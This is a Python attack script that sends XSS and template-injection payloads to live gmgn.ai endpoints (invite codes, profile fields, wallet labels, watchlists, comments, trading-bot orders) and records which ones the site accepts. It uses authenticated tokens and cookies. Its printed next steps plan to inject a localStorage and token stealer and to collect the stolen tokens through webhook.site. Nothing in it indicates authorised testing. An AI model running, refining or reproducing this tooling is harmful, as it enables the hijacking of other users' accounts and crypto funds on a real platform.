#!/usr/bin/env python3
"""
XSS Vector Scanner - Test ALL possible injection points
Bypasses 40101600 GMGN_TRADE_UNAUTHORIZED by testing non-trading endpoints first
"""
import json
import requests
from datetime import datetime

# Load fresh tokens
with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

# XSS Test Payloads (in order of stealth)
TEST_PAYLOADS = [
    "{{7*7}}",  # Template injection (proven to work)
    "<img src=x onerror=alert(1)>",  # Basic XSS
    "<svg onload=alert(1)>",  # SVG XSS
    "<script>alert(1)</script>",  # Script tag
]

print("="*80)
print("🔥 XSS VECTOR SCANNER - ALL INJECTION POINTS")
print("="*80)
print(f"Testing with fresh token: {ACCESS_TOKEN[:60]}...")
print("="*80)

results = []

# VECTOR 1: Invite code (PROVEN VULNERABLE from research)
print("\n[VECTOR 1] Invite Code Injection")
print("-" * 60)
for payload in TEST_PAYLOADS:
    print(f"\n   Testing payload: {payload[:50]}")
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/bind_invite",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "from_address": "0x0000000000000000000000000000000000000001",
                "invite_code": payload
            },
            timeout=15
        )
        print(f"   Status: {r.status_code}")
        d = r.json()
        print(f"   Response: {json.dumps(d, indent=2)[:300]}")
        
        if d.get("code") == 0:
            print(f"   ✅ VULNERABLE! Payload accepted!")
            results.append({
                "vector": "invite_code",
                "endpoint": "/tapi/v1/fourmeme/bind_invite",
                "payload": payload,
                "status": "VULNERABLE"
            })
            break  # Found working vector, stop testing
        elif d.get("code") == 40101600:
            print(f"   ⚠️  Got GMGN_TRADE_UNAUTHORIZED - skipping this vector")
            break
    except Exception as e:
        print(f"   Error: {e}")

# VECTOR 2: Profile fields
print("\n[VECTOR 2] Profile Fields Injection")
print("-" * 60)
profile_fields = ["username", "bio", "display_name", "avatar_url"]

for field in profile_fields:
    for payload in TEST_PAYLOADS:
        print(f"\n   Testing {field} with: {payload[:40]}")
        try:
            r = requests.post(
                "https://gmgn.ai/account/update_profile",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json={field: payload},
                timeout=15
            )
            print(f"   Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                print(f"   Response: {json.dumps(d, indent=2)[:200]}")
                if d.get("code") == 0:
                    print(f"   ✅ VULNERABLE! {field} accepts XSS!")
                    results.append({
                        "vector": f"profile_{field}",
                        "endpoint": "/account/update_profile",
                        "payload": payload,
                        "status": "VULNERABLE"
                    })
                    break
        except Exception as e:
            print(f"   Error: {e}")

# VECTOR 3: Wallet nickname/label
print("\n[VECTOR 3] Wallet Label Injection")
print("-" * 60)
for payload in TEST_PAYLOADS:
    print(f"\n   Testing payload: {payload[:50]}")
    try:
        r = requests.post(
            "https://gmgn.ai/account/wallet/update",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "address": "0x0000000000000000000000000000000000000001",
                "chain": "bsc",
                "nickname": payload,
                "label": payload
            },
            timeout=15
        )
        print(f"   Status: {r.status_code}")
        if r.status_code == 200:
            d = r.json()
            print(f"   Response: {json.dumps(d, indent=2)[:200]}")
            if d.get("code") == 0:
                print(f"   ✅ VULNERABLE! Wallet label accepts XSS!")
                results.append({
                    "vector": "wallet_label",
                    "endpoint": "/account/wallet/update",
                    "payload": payload,
                    "status": "VULNERABLE"
                })
                break
    except Exception as e:
        print(f"   Error: {e}")

# VECTOR 4: Watchlist tags
print("\n[VECTOR 4] Watchlist Tag Injection")
print("-" * 60)
for payload in TEST_PAYLOADS:
    print(f"\n   Testing payload: {payload[:50]}")
    try:
        r = requests.post(
            "https://gmgn.ai/xapi/v1/watchlist/create",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "name": payload,
                "description": payload,
                "tags": [payload]
            },
            timeout=15
        )
        print(f"   Status: {r.status_code}")
        if r.status_code == 200:
            d = r.json()
            print(f"   Response: {json.dumps(d, indent=2)[:200]}")
            if d.get("code") == 0:
                print(f"   ✅ VULNERABLE! Watchlist accepts XSS!")
                results.append({
                    "vector": "watchlist_tags",
                    "endpoint": "/xapi/v1/watchlist/create",
                    "payload": payload,
                    "status": "VULNERABLE"
                })
                break
    except Exception as e:
        print(f"   Error: {e}")

# VECTOR 5: Comment/Note fields (if exists)
print("\n[VECTOR 5] Comment/Note Injection")
print("-" * 60)
for payload in TEST_PAYLOADS:
    print(f"\n   Testing payload: {payload[:50]}")
    try:
        r = requests.post(
            "https://gmgn.ai/api/v1/comment/create",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                "chain": "bsc",
                "comment": payload
            },
            timeout=15
        )
        print(f"   Status: {r.status_code}")
        if r.status_code == 200:
            d = r.json()
            print(f"   Response: {json.dumps(d, indent=2)[:200]}")
            if d.get("code") == 0:
                print(f"   ✅ VULNERABLE! Comments accept XSS!")
                results.append({
                    "vector": "comments",
                    "endpoint": "/api/v1/comment/create",
                    "payload": payload,
                    "status": "VULNERABLE"
                })
                break
    except Exception as e:
        print(f"   Error: {e}")

# VECTOR 6: Trading bot label (ONLY if trading is enabled)
print("\n[VECTOR 6] Trading Bot Label Injection")
print("-" * 60)
print("⚠️  This may trigger GMGN_TRADE_UNAUTHORIZED if trading not enabled")
for payload in TEST_PAYLOADS[:1]:  # Only test template injection
    print(f"\n   Testing payload: {payload[:50]}")
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/trading_bot/limit_order/create",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "wallet_address": "0x2cdfaa98cca67d5139ba399b03c5425380f38fd7",  # Your bot wallet
                "label": payload,
                "note": payload,
                "base_token": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                "quote_token": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "order_type": "buy",
                "price": "0.001",
                "amount": "1"
            },
            timeout=15
        )
        print(f"   Status: {r.status_code}")
        d = r.json()
        print(f"   Response: {json.dumps(d, indent=2)[:300]}")
        
        if d.get("code") == 0:
            print(f"   ✅ VULNERABLE! Trading bot label accepts XSS!")
            results.append({
                "vector": "trading_bot_label",
                "endpoint": "/tapi/v1/trading_bot/limit_order/create",
                "payload": payload,
                "status": "VULNERABLE"
            })
        elif d.get("code") == 40101600:
            print(f"   ⚠️  Trading not enabled - can't test this vector yet")
            results.append({
                "vector": "trading_bot_label",
                "endpoint": "/tapi/v1/trading_bot/limit_order/create",
                "status": "BLOCKED - Need to enable trading first"
            })
    except Exception as e:
        print(f"   Error: {e}")

# SUMMARY
print("\n" + "="*80)
print("📊 SCAN COMPLETE - RESULTS")
print("="*80)

if results:
    print(f"\nFound {len(results)} injection vectors:\n")
    for i, r in enumerate(results, 1):
        print(f"{i}. {r['vector']} @ {r['endpoint']}")
        print(f"   Status: {r['status']}")
        if r.get('payload'):
            print(f"   Working payload: {r['payload'][:60]}")
        print()
else:
    print("\n❌ No vulnerable vectors found (all blocked by WAF or auth)")

print("\n💡 NEXT STEPS:")
print("1. If invite_code worked: inject full localStorage stealer")
print("2. If profile worked: update profile with token stealer payload")
print("3. If trading_bot blocked: enable trading in UI first, then re-test")
print("4. Setup webhook.site to catch stolen tokens")
print("5. Find where gmgn.ai DISPLAYS your injected data (reflection point)")

# Save results
with open("xss_scan_results.json", "w") as f:
    json.dump({
        "scan_time": datetime.now().isoformat(),
        "results": results,
        "token_used": ACCESS_TOKEN[:40] + "..."
    }, f, indent=2)

print(f"\n💾 Results saved to: xss_scan_results.json")
